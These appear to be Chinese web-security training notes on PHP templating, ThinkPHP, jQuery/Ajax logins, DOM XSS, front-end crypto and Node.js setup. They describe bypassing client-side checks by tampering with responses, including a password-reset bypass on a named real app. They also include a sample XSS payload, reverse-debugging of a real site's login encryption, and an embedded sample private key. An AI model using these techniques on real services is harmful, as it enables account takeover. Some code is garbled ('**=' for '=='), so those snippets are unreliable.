存储对象去存储文件(泄漏安全)\n3、把文件上传到其他域名, 如：www.xiaodi8.com-&gt; upload.xiaodi8.com\n\n\n\n文件删除\n\nunlink() 文件删除函数\n调用命令删除：system shell_exex exec\n\n文件下载\n\n修改 HTTP 头实现文件读取解析下载\n\n1234header(&quot;Content-Type: application/octet-stream&quot;);header(&quot;Content-Disposition: attachment; filename=&quot;&quot;);header(&quot;Content-Length: &quot; . filesize($file));readfile($file);\n文件编辑\n\n\n1.file_get_contents() 读取文件内容\n\n\n2.fopen() fread() 文件打开读入\n\n\n存在的安全漏洞：跨过对操作文件的执行，进行对其他目录文件的执行，如果使用了系统命令那么可以使用管道符进行进一步的命令操作\n\n\n六、PHP 应用&amp;模版引用&amp;Smarty 渲染&amp;MVC 模型&amp;数据联动\n新闻列表\n\n\n1.数据库创建新闻存储\n\n\n2.代码连接数据库读取\n\n\n3.页面进行自定义显示\n\n\n自写模版应用\n\n1.页面显示样式编排\n2.显示数据插入页面\n3.引用模版调用触发\n在数据库行里添加 php 代码，会运行\n访问 html 代码页面，里面的 php 代码不会执行，但是 php 文件应用了含有 php 代码的 html 文件，则会执行 html 文件里面的代码\n\nSmarty 模版引用\n\n\n作用：渲染页面，提升美观，安全\n\n\n下载：https://github.com/smarty-php/smarty/releases\n\n\n使用：\n\n1.创建一个文件夹，命名为 samrty-demo\n2.下载 Smarty 对应的版本并解压到该文件夹中\n3.创建一个 php 文件，命名为 index.php，并在文件中添加以下代码\n\n12345678910111213141516171819202122232425262728293031&lt;?php// 引入 Smarty 类文件require(&#x27;smarty-demo/libs/Smarty.class.php&#x27;);// 创建 Smarty 实例$smarty = new Smarty;// 设置 Smarty 相关属性$smarty-&gt;template_dir = &#x27;smarty-demo/templates/&#x27;;$smarty-&gt;compile_dir = &#x27;smarty-demo/templates_c/&#x27;;$smarty-&gt;cache_dir = &#x27;smarty-demo/cache/&#x27;;$smarty-&gt;config_dir = &#x27;smarty-demo/configs/&#x27;;// 赋值变量到模板中$smarty-&gt;assign(&#x27;title&#x27;, &#x27;欢迎使用 Smarty&#x27;);// 显示模板$smarty-&gt;display(&#x27;index.tpl&#x27;);?&gt;\n\n4.创建一个名为 index.tpl 的模版文件，并将一下代码复制到上述点定义文件夹中\n\n123456789101112131415161718192021&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;&#123;$title&#125;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;&#123;$title&#125;&lt;/h1&gt;&lt;p&gt;这是一个使用 Smarty 的例子。&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;\n\n\n代码 RCE 安全测试\n\n\n1.自写模版的安全隐患\n\n\n2.第三方 Smarty 的安全隐患\n\n\n从功能点上面找漏洞\n\n\n项目用到的组件，可能有漏洞，思考组件会不会调用到关键函数\n\n\n七、PHP 应用&amp;ThinkPHP 框架&amp;路由访问&amp;对象操作&amp;内置过滤绕过&amp;核心漏洞\nTP 框架-开发-配置架构&amp;路由&amp;MVC 模型\n\n参考：https://www.kancloud.cn/manual/thinkphp5_1\n1.配置架构-导入引用\n2.路由访问-URL 访问\n3.数据库操作-应用对象\n4.文件上传操作-应用对象\n5.前端页面渲染-MVC 模型\n\nTP 框架-安全-不安全写法&amp;版本过滤绕过\n\n1.内置代码写法\n\n例子：不合规的代码安全绕过-TP5-自写\n\n\n2.框架版本安全\n\n例子：写法内置安全绕过-TP5-SQL 注入\n例子：内置版本安全漏洞-TP5-代码执行\n\n\n\n逻辑漏洞\n\n用户身份在数据库中有 uid 类似的数据，这项数据不同数值会表示不同身份（管理员，会员，游客等等），通过修改这项数据，可以跨身份。\n\nJS 开发\n一、JS 应用&amp;原生开发&amp;JQuery库&amp;Ajax技术&amp;前后端&amp;安全验证处理\n12原生 JS 教程：https://www.w3school.com.cn/js/index.aspJQuery库教程：https://www.w3school.com.cn/jquery/index.asp\n1.介绍的 js 函数\n\n\n这一行代码是一个HTML中的 JavaScript 事件处理器，用于在文件选择框内容发生变化（用户选择文件）时触发相应的检查函数。具体来说：\n1&lt;input type=&quot;file&quot; id=&quot;file&quot; name=&quot;f&quot; onchange=&quot;CheckFileExt(this.value)&quot;&gt;\n\nonchange：这是一个HTML事件属性，表示在元素内容变化时触发\nCheckFileExt(this.value)：这是一个 JavaScript 函数调用，当文件选择框内容变化时，会调用名为CheckFileExt的函数，并将选择的文件路径（this.value表示当前元素的值，即文件路径）作为参数传递该函数\n\n\n\n这段 JavaScript 代码用于获取文件名中最后一个点（.）后面的部分，即文件的扩展名。\n1var index = filename.lastIndexOf(&quot;.&quot;)\n\nlastIndexOf(&quot;.&quot;)：这是 JavaScript 字符串对象的方法，用于返回字符串中最后一个出现的点的索引位置。\n\n1var ext = filename.substr(index+1);\n\nsubstr(index+1): 这是 JavaScript 字符串对象的方法，用于从字符串的指定位置（在这里是 index+1，即点的后一个位置）开始提取子字符串。这里的 ext 变量将包含文件的扩展名。\n\n\n\n这是一个 JavaScript 代码片段，用于重新加载当前页面。\n1location.reload(true);\n\nlocation.reload(true): 这是 JavaScript 的 location 对象的 reload 方法。reload 方法用于重新加载当前文档。传递 true 参数表示强制从服务器重新加载页面，而不使用缓存。如果省略参数或传递 false，则可能使用缓存进行重新加载。\n这行代码的作用是前置刷新当前页面，确保获取最新的内容，而不使用浏览器缓存。\n\n\n\n使用js实现文件上传\n1234567891011&lt;!-- 表单用于文件上传，指定了上传的目标地址为 &quot;upload.php&quot;，使用 POST 方法提交，并设置 enctype 为 &quot;multipart/form-data&quot; --&gt;&lt;form action=&quot;upload.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;!-- 为文件上传输入框添加标签 --&gt;    &lt;label for=&quot;file&quot;&gt;选择文件:&lt;/label&gt;    &lt;br&gt;    &lt;!-- 这是一个包含文件上传输入框的 HTML 代码，并且在用户选择文件时触发 CheckFileExt 函数 --&gt;    &lt;input type=&quot;file&quot; id=&quot;file&quot; name=&quot;f&quot; onchange=&quot;CheckFileExt(this.value)&quot;&gt;    &lt;br&gt;    &lt;!-- 提交按钮 --&gt;    &lt;button type=&quot;submit&quot;&gt;上传文件&lt;/button&gt;&lt;/form&gt;\n\n\n2.前端 JS 进行后端过滤，后端PHP进行上传处理\n\n\n架构：html js php -upload.php\n12345678910111213141516171819202122232425262728&lt;script&gt;    // JavaScript 函数 CheckFileExt 用于检查文件后缀名    function CheckFileExt(filename)&#123;        var flag = false;        // 允许的文件后缀名数组        var exts = [&#x27;png&#x27;, &#x27;gif&#x27;, &#x27;jpg&#x27;];        // 获取文件名中最后一个点后面的部分，即文件的后缀名        var index = filename.lastIndexOf(&#x27;.&#x27;);        var ext = filename.substr(index + 1);        // 遍历允许的文件后缀名数组        for (var i = 0; i &lt; exts.length; i++) &#123;            // 检查是否匹配允许的后缀名            if (ext **= exts[i]) &#123;                // 文件后缀名正确，设置 flag 为 true，显示提示信息，并跳出循环                flag = true;                alert(&#x27;文件后缀名正确&#x27;);                break;            &#125;        &#125;        // 如果 flag 为 false，表示文件后缀名错误，显示错误提示，并强制刷新页面        if (!flag) &#123;            alert(&#x27;文件后缀错误！&#x27;)            location.reload(true);        &#125;    &#125;&lt;/script&gt;\n\n\n\n\n\n安全问题\n\n\n过滤代码能在前端看到分析绕过\n\n\n\n直接禁用JavaScript，可以无视前端过滤\n\n\n3.JS 导入库开发-登录验证-jQuery库&amp;Ajax技术\n\n\n**$.ajax()**是一个用于执行异步 HTTP 请求的 jQuery 函数。他允许你通过 JavaScript 代码向服务器发送请求，并在不刷新整个页面的情况下接收和处理相应。\n12345678910111213141516$.ajax(&#123;  url: &quot;example.com/data&quot;,  // 请求的URL  method: &quot;GET&quot;,            // HTTP请求方法（GET、POST等）  data: &#123;                   // 发送到服务器的数据（可选）    param1: &quot;value1&quot;,    param2: &quot;value2&quot;  &#125;,  success: function(response) &#123;  // 请求成功时的回调函数    console.log(&quot;请求成功！&quot;);    console.log(response);       // 服务器响应的数据  &#125;,  error: function(xhr, status, error) &#123;  // 请求失败时的回调函数    console.log(&quot;请求失败！&quot;);    console.log(error);                    // 错误信息  &#125;&#125;);\n\n在这个示例中，我们通过url参数指定了服务器的URL，通过method参数指定了HTTP请求方法（这里是GET请求）。data参数是可选的，用于发送到服务器的数据。success回调函数在请求成功并且服务器返回响应时被调用，error回调函数在请求失败时被调用。\n可以根据需要在$.ajax()函数中使用其他参数，例如dataType指定服务器响应的数据类型，headers指定请求头，以及其他高级选项\n通过使用$.ajax()函数，可以在 JavaScript 中方便的执行异步HTTP请求，并根据服务器的响应进行相应的处理\n\n\n\n$(&quot;button&quot;).click(function()&#123;...&#125;)选择所有的&lt;button&gt;元素。并为他们绑定一个点击事件处理函数\n\n我们使用cosole.log()在控制台输出一条消息，表示按钮已被点击，还可以执行其他操作，例如修改页面的内容，发送 Ajax 请求或执行其他 JavaScript 逻辑\n\n12345$(&quot;button&quot;).click(function () &#123;  // 在这里编写点击事件的处理代码  console.log(&quot;按钮被点击了！&quot;);  // 可以在这里执行其他操作，例如修改页面内容或发送AJAX请求等&#125;);\n\n\n$('.user').val()和$('.pass').val()用于获取具有user类和pass类的元素的值。\n\n$('.user')：这里使用了 jQuery 的选择器$('.user')来选择所有具有user类的元素。这可以是一个输入框，文本框或其他表单元素\n.val()：这是一个jQuery函数，用于获取选定元素的值。在这个场景中，它被调用以获取具有user类的元素的值、\nmtuser：这是一个变量（或属性名），用于存储所选择元素的值。也可以根据需要更改变量名\n\n12myuser: $(&#x27;.user&#x27;).val(),mypass: $(&#x27;.pass&#x27;).val()\n\n\n$success 是一个关联数组变量，通过使用 ‘msg’ 作为键，将 ‘ok’ 作为值存储在其中。\n1$success = array(&#x27;msg&#x27; =&gt; &#x27;ok&#x27;);\n\n\n使用 js 实现登录验证\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;div class=&quot;login&quot;&gt;    &lt;!-- 登录标题 --&gt;    &lt;h2&gt;后台登录&lt;/h2&gt;    &lt;!-- 用户名标签和输入框 --&gt;    &lt;label for=&quot;username&quot;&gt;用户名:&lt;/label&gt;    &lt;input type=&quot;text&quot; name=&quot;username&quot; id=&quot;username&quot; class=&quot;user&quot;&gt;    &lt;!-- 密码标签和输入框 --&gt;    &lt;label for=&quot;password&quot;&gt;密码:&lt;/label&gt;    &lt;input type=&quot;password&quot; name=&quot;password&quot; id=&quot;password&quot; class=&quot;pass&quot;&gt;    &lt;!-- 登录按钮 --&gt;    &lt;button&gt;登录&lt;/button&gt;&lt;/div&gt;**&lt;!-- 引入 jQuery 库 --&gt;&lt;script src=&quot;js/jquery-1.12.4.js&quot;&gt;&lt;/script&gt;**&lt;!-- JavaScript 代码 --&gt;&lt;script&gt;    // 当按钮被点击时执行以下函数    $(&quot;button&quot;).click(function ()&#123;        // 使用 AJAX 发送 POST 请求到 &#x27;logincheck.php&#x27;        $.ajax(&#123;            type: &#x27;POST&#x27;,            url: &#x27;logincheck.php&#x27;,            // 发送的数据包括用户名和密码            data: &#123;                myuser: $(&#x27;.user&#x27;).val(),                mypass: $(&#x27;.pass&#x27;).val()            &#125;,            **// 请求成功时执行的函数            success: function (res)&#123;                console.log(res);                // 如果返回的信息代码为1，表示登录成功，弹出提示并执行相应的处理                if(res[&#x27;infoCode&#x27;] ** 1)&#123;                    alert(&#x27;登录成功&#x27;);                    // 登录成功处理事件（注释部分为示例，可根据需要进行处理）                    // location.href=&#x27;index.php&#x27;;                &#125; else &#123;                    // 如果信息代码不为1，表示登录失败，弹出失败提示                    alert(&#x27;登录失败&#x27;);                &#125;            &#125;,**            // 指定返回的数据类型为 JSON            dataType: &#x27;json&#x27;,        &#125;);    &#125;);&lt;/script&gt;\n123450、布置前端页面在js目录下创建login.html,并引入JQuery库在js目录下创建js目录引入。1、获取登录事件2、配置Ajax请求3、后端代码验证4、成功回调判断\n\n\n\n安全问题\n\n\n当成功后的操作如跳转到其他页面写在js中，不安全\n\n\n将抓到的包，设置其返回包也抓取，并将访问失败返回包的改为1发送，后登录成功\n\n\n\n\n\n当成功的操作如跳转到其他页面写在php后端当中，就会相对安全，让前端 js 只起到判断作用，无法执行跳转逻辑\n\n\n4.JS 导入库开发-逻辑购买-jQuery库&amp;Ajax技术\n\n\n使用 js 实现商品购买：\n1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;!-- 设置文档的字符集为UTF-8 --&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;!-- 设置页面标题 --&gt;    &lt;title&gt;商品购买&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;!-- 商品图片 --&gt;&lt;img src=&quot;iphone.jpg&quot; width=&quot;300&quot; height=&quot;300&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;!-- 当前拥有的金钱 --&gt;金钱：10000&lt;br&gt;&lt;!-- 商品价格 --&gt;商品价格：8888&lt;br&gt;&lt;!-- 输入购买数量的文本框 --&gt;数量：&lt;input type=&quot;text&quot; name=&quot;number&quot; class=&quot;number&quot;&gt;&lt;!-- 购买按钮 --&gt;&lt;button&gt;购买&lt;/button&gt;&lt;/body&gt;&lt;/html&gt;&lt;!-- 引入 jQuery 库 --&gt;&lt;script src=&quot;js/jquery-1.12.4.js&quot;&gt;&lt;/script&gt;&lt;!-- JavaScript 代码 --&gt;&lt;script&gt;    // 当购买按钮被点击时执行以下函数    $(&quot;button&quot;).click(function ()&#123;        // 使用 AJAX 发送 POST 请求到 &#x27;shop.php&#x27;        $.ajax(&#123;            type: &#x27;POST&#x27;,            url: &#x27;shop.php&#x27;,            // 发送的数据，包括购买数量            data: &#123;                num: $(&#x27;.number&#x27;).val(),            &#125;,            // 请求成功时执行的函数            success: function (res)&#123;                // 在控制台输出返回的数据                console.log(res);                // 如果返回的信息代码为1，表示购买成功                if(res[&#x27;infoCode&#x27;] ** 1)&#123;                    // 弹出成功提示                    alert(&#x27;购买成功&#x27;);                    // 购买成功的流程（你可以在这里添加额外的处理）                &#125; else &#123;                    // 如果信息代码不为1，表示购买失败                    // 弹出失败提示                    alert(&#x27;购买失败&#x27;);                &#125;            &#125;,            // 指定返回的数据类型为 JSON            dataType: &#x27;json&#x27;,        &#125;);    &#125;);&lt;/script&gt;\n123451、布置前端页面，在js目录下创建shop.html2、获取登录事件3、配置Ajax请求4、后端代码验证 ,在js目录下创建shopcheck.php5、成功回调判断\n\n\n架构：html js shop.html - shopcheck.php\n1234567891011121314151617181920212223&lt;?php// 从 POST 请求中获取购买数量$num = $_POST[&#x27;num&#x27;];// 假设购物车中已有的金钱数为10000，商品价格为8888// 真实情况下，应该在数据库中获取用户的金钱数等信息// 初始化一个关联数组变量，通过使用 &#x27;msg&#x27; 作为键，将 &#x27;ok&#x27; 作为值存储在其中。$success = array(&#x27;msg&#x27; =&gt; &#x27;ok&#x27;);// 检查购买是否合法（金钱是否足够支付）if (10000 &gt;= ($num * 8888)) &#123;    // 如果购买合法，设置信息代码为1表示购买成功    $success[&#x27;infoCode&#x27;] = 1;&#125; else &#123;    // 如果购买不合法，设置信息代码为0表示购买失败    $success[&#x27;infoCode&#x27;] = 0;&#125;// 将结果以 JSON 格式输出echo json_encode($success);?&gt;\n\n\n如果购买量大于持有金额，就会提示失败\n\n\n\n安全问题跟上面差不多，也可以通过改响应值，达到购买成功的目的\n\n\n5.实例测试 - 某违规app-密码找回&amp;JS 验证逻辑安全\n\n\n这里用福利期货这个app来进行演示，首先我们进行抓包\n\n\n\n抓下输入正确短信的响应包\n\n\n\n\n\n\n将正确的回显数据记录下来\n\n\n然后我们再用我们想要修改密码的手机号，这里验证码和短信都随便输就行\n\n\n\n将错误的回显数据改成正确的，成功进入修改界面\n\n\n\n二、JS 应用&amp;DOM树&amp;加密编码库&amp;断点调试&amp;逆向分析&amp;元素属性操作\n1.JS 原生开发-DOM树-用户交互\n\nDOM：文档操作对象\n浏览器提供的一套专门用来操作网页代码的功能，实现自主或用户交互动作反馈\n\n123在Web开发中，浏览器将HTML文档解析为DOM树的结构。DOM树由节点（Nodes）组成，节点可以是元素节点、文本节点、注释节点等。每个节点都有与之相关联的属性、方法和事件。通过使用DOM，您可以通过JavaScript或其他支持DOM的编程语言来访问和操作HTML文档的内容、结构和样式。您可以使用DOM提供的方法和属性来选择元素、修改元素的属性和内容、添加或删除元素，以及响应用户交互等。\n获取对象\n123标签：直接写Class：加上符号id：加上符号#r\n\n\ndocument是代表整个文档的对象，而querySelector()是在文档中查找与制定选择器匹配的第一个元素的方法\n1234567891011&lt;!-- 这是标题 --&gt;&lt;h1 id=&quot;myHeader&quot; onclick=&quot;getValue()&quot;&gt;这是标题&lt;/h1&gt;&lt;!-- 选择第一个 h1 元素 --&gt;document.querySelector(&#x27;h1&#x27;)&lt;!-- 选择所有具有 &#x27;id&#x27; 类的元素 --&gt;document.querySelector(&#x27;.id&#x27;)&lt;!-- 选择具有 &#x27;myHeader&#x27; id 的元素 --&gt;document.querySelector(&#x27;#myHeader&#x27;)\n\n\n获取对象属性\n\n\nconsole.log():是一个用于在控制台输出信息的方法，它是由浏览器或其他JavaScript运行环境提供的调试工具。通过调用console.log()，我们可以在控制台中输出信息、变量的值、调试信息等，以便在开发过程进行调试和测试\n123例如：console.log(&quot;Hello, world!&quot;);这行代码将在控制台输出字符串 &quot;Hello, world!&quot;。\n\n\nconst:是 JavaScript 中的一个关键字，用于声明一个只读的常量变量。使用 const 声明的变量不能被重新赋值。一旦被赋值后，他的值就不能改变\n123例如：const PI = 3.14159;这行代码声明了一个常量 PI，其值为 3.14159。由于是常量，PI 的值不能再被修改。\n\n总结：console.log() 是一个用于输出信息到控制台的方法，而 const 是一个关键字，用于声明只读的常量变量。它们在功能和用途上是完全不同的。\n\n1234567891011121314&lt;!-- HTML代码 --&gt;&lt;h1 id=&quot;myHeader&quot; onclick=&quot;getValue()&quot;&gt;这是标题&lt;/h1&gt;&lt;!-- JavaScript代码 --&gt;&lt;script&gt;  // 选择第一个 h1 元素  const h1 = document.querySelector(&#x27;h1&#x27;);  // 获取 h1 元素的 id 属性  const id = h1.id;  // 输出 id 到控制台  console.log(id);&lt;/script&gt;\n\n\n操作元素数据\n\n\ninnerHTML 解析后续代码\n123var element = document.getElementById(&quot;myElement&quot;);var htmlContent = element.innerHTML; // 获取元素的内容（包括 HTML 标记）element.innerHTML = &quot;&lt;b&gt;New Content&lt;/b&gt;&quot;; // 设置元素的内容，并解析 HTML 标记\n\n\n\ninnerText 不解析后续代码\n123var element = document.getElementById(&quot;myElement&quot;);var textContent = element.innerText; // 获取元素的纯文本内容element.innerText = &quot;New Text Content&quot;; // 设置元素的纯文本内容\n\n\n\n操作元素属性\n\n\n可以实现强制转换图片\n12345678910&lt;img src=&quot;iphone.jpg&quot; width=&quot;300&quot; height=&quot;300&quot;&gt;&lt;br&gt;&lt;script&gt;    function update()&#123;        **const s=document.querySelector(&#x27;img&#x27;)        s.src=&#x27;huawei.png&#x27;        console.log(s.src)        //如果这里huawei.png为一个变量由用户传递决定，那么就会造成DOM XSS**    &#125;&lt;/script&gt;\n\n\n\n安全问题\n\n本身前段代码通过DOM技术实现代码的更新修改，但是更新修改如果修改的数据可以由用户来制定，就会造成DOM-XSS攻击\n\n实战案例\n\n\n网易云翻译：可以使用带外的dns，造成数据库ip泄露，鼠标点击右边翻译的结果会进行刷新成功执行代码，不然会有实体化（现在好像不行了）\n\n\n\n\nupdatel函数通过innerHTML插入带有onerror事件的img元素，这可能导致 xss（跨站脚本攻击）漏洞。在实际应用中，需要谨慎处理用户提供的内容，以防止安全漏洞\n12345678&lt;h1 id=&quot;myHeader&quot; onclick=&quot;update1()&quot;&gt;这是标题&lt;/h1&gt;&lt;script&gt;function update1()&#123;        const h1=document.querySelector(&#x27;h1&#x27;)        **h1.innerHTML=&#x27;&lt;img src=# οnerrοr=&quot;alert(1)&quot;&gt;&#x27;**        console.log(str)    &#125;&lt;/script&gt;\n\n\n2.JS 导入库开发-编码加密-逆向调试\nMD5\n1234567891011121314&lt;!-- 引入 md5.js 脚本 --&gt;&lt;script src=&quot;js/md5.js&quot;&gt;&lt;/script&gt;&lt;!-- JavaScript 代码 --&gt;&lt;script&gt;    // 定义字符串变量    var str1 = &#x27;xiaodi jichu No1&#x27;;    // 使用 md5.js 中的 md5 函数对字符串进行加密    var str_encode = md5(str1);    // 输出加密后的字符串到控制台    console.log(str_encode);&lt;/script&gt;\n输出：afe5119ec0ab46b55432fc5e24f1dc62\nSHA1\n1234567891011121314&lt;!-- 引入 crypto-js.js 脚本 --&gt;&lt;script src=&quot;js/crypto-js.js&quot;&gt;&lt;/script&gt;&lt;!-- JavaScript 代码 --&gt;&lt;script&gt;    // 定义字符串变量    var str1 = &#x27;xiaodisec&#x27;;    // 使用 CryptoJS.SHA1 函数对字符串进行 SHA-1 加密，并将结果转为字符串    var str_encode = CryptoJS.SHA1(str1).toString();    // 输出加密后的字符串到控制台    console.log(str_encode);&lt;/script&gt;\n输出：ce22eaa1c5ebd3dfb3f4474b66f6d3612d4cb3ee\nHMAC\n12345678910111213141516171819&lt;!-- 引入 crypto-js.js 脚本 --&gt;&lt;script src=&quot;js/crypto-js.js&quot;&gt;&lt;/script&gt;&lt;!-- JavaScript 代码 --&gt;&lt;script&gt;    // 定义密钥和字符串变量    var key = &#x27;key&#x27;;    var str1 = &#x27;xiaodisec&#x27;;    // 使用 CryptoJS.HmacSHA256 函数生成 HMAC-SHA256 散列    var hash = CryptoJS.HmacSHA256(key, str1);    // 将散列结果转为十六进制字符串    var str_encode = CryptoJS.enc.Hex.stringify(hash);    // 输出加密后的字符串到控制台    console.log(str_encode);    // 输出示例：&#x27;11a7960cd583ee2c3f1ed910dbc3b6c3991207cbc527d122f69e84d13cc5ce5c&#x27;&lt;/script&gt;\n输出：08ac6dc8773bd34dcadeffb2b90a8b8f5be9453a9dce7cf09d4da2fcb363d9e7\nAES\n123456789101112131415161718192021&lt;script src=&quot;js/crypto-js.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;&gt;    var aseKey = &quot;12345678&quot;     // 定制秘钥，长度必须为：8/16/32位, 长度不一致也没问题    var message = &quot;xiaodisec&quot;;  // 需要加密的内容    // 加密 DES/AES切换只需要修改 CryptoJS.AES &lt;=&gt; CryptoJS.DES    var encrypt = CryptoJS.AES.encrypt(message, CryptoJS.enc.Utf8.parse(aseKey),  // 参数1=密钥, 参数2=加密内容        &#123;            mode: CryptoJS.mode.ECB, // 为DES的工作方式            padding: CryptoJS.pad.Pkcs7  // 当加密后密文长度达不到指定整数倍(8个字节、16个字节)则填充对应字符        &#125;    ).toString(); // toString=转字符串类型    console.log(encrypt);    var decrypt = CryptoJS.AES.decrypt(encrypt, CryptoJS.enc.Utf8.parse(aseKey), // 参数1=密钥, 参数2=解密内容        &#123;            mode: CryptoJS.mode.ECB,            padding: CryptoJS.pad.Pkcs7        &#125;    ).toString(CryptoJS.enc.Utf8); // toString=转字符串类型,并指定编码    console.log(decrypt); // &quot;xiaodisec&quot;&lt;/script&gt;\n输出：g4ohopaiYA34XXLsV92Udw** xiaodisec\nDES\n123456789101112131415161718192021222324&lt;script src=&quot;js/crypto-js.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;&gt;    var aseKey = &quot;12345678&quot;     // 定制秘钥，长度必须为：8/16/32位， 长度不一致也没问题    var message = &quot;xiaodisec&quot;;  // 需要加密的内容    // 加密 DES/AES切换只需要修改 CryptoJS.AES &lt;=&gt; CryptoJS.DES    var encrypt = CryptoJS.DES.encrypt(message, CryptoJS.enc.Utf8.parse(aseKey),  // 参数1=密钥, 参数2=加密内容        &#123;            mode: CryptoJS.mode.ECB, // 为DES的工作方式            padding: CryptoJS.pad.Pkcs7  // 当加密后密文长度达不到指定整数倍(8个字节、16个字节)则填充对应字符        &#125;    ).toString(); // toString=转字符串类型    console.log(encrypt); // 控制台打印 CDVNwmEwDRM    //解密    var decrypt = CryptoJS.DES.decrypt(encrypt, CryptoJS.enc.Utf8.parse(aseKey), // 参数1=密钥, 参数2=解密内容        &#123;            mode: CryptoJS.mode.ECB,            padding: CryptoJS.pad.Pkcs7        &#125;    ).toString(CryptoJS.enc.Utf8); // toString=转字符串类型,并指定编码    console.log(decrypt); // 控制台打印 &quot;i am xiaozhou ?&quot;&lt;/script&gt;\n输出：WVSwdlodMcV2n1FH72uXgw** xiaodisec\nRSA\n123456789101112131415161718&lt;script src=&quot;js/jsencrypt.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;&gt;    // 公钥 私匙是通过公匙计算生成的，不能盲目设置    var PUBLIC_KEY = &#x27;-----BEGIN PUBLIC KEY-----MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBALyBJ6kZ/VFJYTV3vOC07jqWIqgyvHulv6us/8wzlSBqQ2+eOTX7s5zKfXY40yZWDoCaIGk+tP/sc0D6dQzjaxECAwEAAQ**-----END PUBLIC KEY-----&#x27;;    //私钥    var PRIVATE_KEY = &#x27;-----BEGIN PRIVATE KEY-----MIIBVQIBADANBgkqhkiG9w0BAQEFAASCAT8wggE7AgEAAkEAvIEnqRn9UUlhNXe84LTuOpYiqDK8e6W/q6z/zDOVIGpDb545NfuznMp9djjTJlYOgJogaT60/+xzQPp1DONrEQIDAQABAkEAu7DFsqQEDDnKJpiwYfUE9ySiIWNTNLJWZDN/Bu2dYIV4DO2A5aHZfMe48rga5BkoWq2LALlY3tqsOFTe3M6yoQIhAOSfSAU3H6jIOnlEiZabUrVGqiFLCb5Ut3Jz9NN+5p59AiEA0xQDMrxWBBJ9BYq6RRY4pXwa/MthX/8Hy+3GnvNw/yUCIG/3Ee578KVYakq5pih8KSVeVjO37C2qj60d3Ok3XPqBAiEAqGPvxTsAuBDz0kcBIPqASGzArumljkrLsoHHkakOfU0CIDuhxKQwHlXFDO79ppYAPcVO3bph672qGD84YUaHF+pQ-----END PRIVATE KEY-----&#x27;;    //使用公钥加密    var encrypt = new JSEncrypt();//实例化加密对象    encrypt.setPublicKey(PUBLIC_KEY);//设置公钥    var message = &#x27;xiaodisec&#x27; // 需要加密的数据    var encrypted = encrypt.encrypt(message);//对指定数据进行加密    console.log(encrypted)  // &#x27;JQ83h8tmJpsSZcb4BJ3eQvuqIAs3ejepcUUnoFhQEvum8fA8bf1Y/fG+DO1bSIVNJF6EOZKe4wa0njv6aOar9w**&#x27;    //使用私钥解密    var decrypt = new JSEncrypt(); // 创建解密对象    decrypt.setPrivateKey(PRIVATE_KEY); //设置私钥    var uncrypted = decrypt.decrypt(encrypted); //解密 &#x27;xiaodisec&#x27;    console.log(uncrypted);&lt;/script&gt;\n输出：Fw1H5KoC6zZnwAzLee8z5ubmQYSqaVqu711VI+NBavYT9bkWpzxUtZHmbSUvLbuCblPO96NdfoQHtPe9TURo6A** xiaodisec\n逆向调试\n\n\n由于如果前端进行加密的话，抓到的包里面的密码是被加密过的，我们就不能直接写注入语句了，需要知道对方是用什么来进行加密的\n\n\n测试网站：小迪渗透吧-提供最专业的渗透测试培训,web安全培训,网络安全培训,代码审计培训,安全服务培训,CTF比赛培训,SRC平台挖掘培训,红蓝对抗培训！-登录 (xiaodi8.com)\n\n\n打开页面，选择密码右击点开检查，找到相关的id值\n\n\n\n然后进行全局搜索，找到$(&quot;#btnPost&quot;).click(function() （加#后证明是想取id值中的edtPassWord）\n\n\n\n从这里可以看出来他的加密方式是md5\n\n\n如果加密的格式不显示出来，那么我们该怎么判断加密的方式呢？\n\n\n可以借助检查的工具台，尝试输入获取加密后的密码值，再和提交表单的加密值进行比对，如果一样的话我们就能识别出来了。（但一般安全防护比较强的，不会吧运行的所有东西加载到浏览器上）\n\n\n断点调试\n\n\n如果我们遇到安全防护比较强的，他们不会把运行的东西全部加载到浏览器上，所以我们需要进行断点调试\n\n\n测试网站：申通快递会员中心-登录 (sto.cn)（好像也不行了）\n\n\n\n打开页面，选择密码右击进行检查找到相关的id值numPassword并进行全局搜索\n\n\n找到密码的加密格式，但是没有明文展现出来\n1234logindata.UserName = encodeURI(encrypt.encrypt(numMobile));logindata.Mobile = encodeURI(encrypt.encrypt(numMobile));;//加密密码logindata.Password = encodeURI(encrypt.encrypt(numPassword));\n\n\n我们采用之前的办法，先在控制台输入相对应的代码encodeURL(encrypt(numPassword))发现报错了，这是因为有一些文件只在服务器本地执行，不会加载到浏览器中，我们直接让控制台输出是不行的\n\n\n\n那么这个时候我们就要采用断点调试的方法了，先在加密的那里打上断点\n\n\n\n点击登录，成功在那里停止了，那我们点几次下一步\n\n\n\n观察右边的数据，发现有变动后，我们来到控制台，这个时候在拿那个函数进行加密\n\n\n\n成功了\n\n\n三、JS 应用&amp;NodeJS指南&amp;原型链污染&amp;Express框架&amp;功能实现&amp;审计\n1.Nodejs安装和文档参考\n\nhttps://nodejs.org/en\nhttps://www.w3cschool.cn/nodejs/\n\n2.三方库安装\n\n\nexpress\n\nExpress是一个简介而灵活的node.js web应用框架\n\n\n\nbody-parser\n\nnode.js 中间件，用于处理 JSON，Raw，Text和URL 编码的数据\n\n\n\ncookie-parser\n\n这就是一个解析Cookie的工具。通过req。cookies 可以渠道传过来的cookie，并把他们转成对象\n\n\n\nmulter\n\nnode.js 中间件，用于处理 enctype=“multipart/form-data”（设置表单的MIME编码）的表单数据\n\n\n\nmysql\n\nnode.js 来连接mysql专用库，并对数据库进行操作\n\n\n\n123456安装命令：npm i expressnpm i body-parsernpm i cookie-parsernpm i multernpm i mysql\n\n创建sql.js文件并粘贴实例代码\n\n发现代码不能运行，需要安装需要的库\n如果网速太慢，可以用国内的镜像\n发现展示出 hello 